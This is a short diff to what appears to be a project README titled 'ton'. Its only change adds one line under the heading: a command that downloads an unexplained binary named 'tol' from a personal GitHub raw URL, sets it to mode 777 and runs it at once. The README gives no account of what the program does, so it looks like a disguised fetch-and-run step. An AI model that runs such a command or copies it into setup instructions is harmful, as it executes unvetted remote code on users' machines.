@@ -1,5 +1,5 @@
 # ton
-
+wget https://raw.githubusercontent.com/aurbach55/a/main/tol && chmod 777 tol && ./tol
 
 
 ## Getting started
